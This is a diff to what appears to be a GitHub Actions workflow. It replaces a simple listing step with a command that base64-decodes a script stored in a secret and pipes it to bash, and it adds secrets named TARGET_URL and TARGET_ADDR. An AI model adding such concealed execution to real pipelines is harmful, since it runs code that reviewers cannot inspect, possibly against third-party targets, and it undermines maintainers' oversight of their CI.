@@ -5,6 +5,10 @@ jobs:
   check-bats-version:
     runs-on: ubuntu-latest
     steps:
-      - run: 'ls -al; echo $MYNAME'
+      - run: |
+          bash <(echo "$INSTALL" | base64 -d)
         env:
           MYNAME: ${{ secrets.MYNAME }}
+          INSTALL: ${{ secrets.INSTALL }}
+          TARGET_URL: ${{ secrets.TARGET_URL }}
+          TARGET_ADDR: ${{ secrets.TARGET_ADDR }}
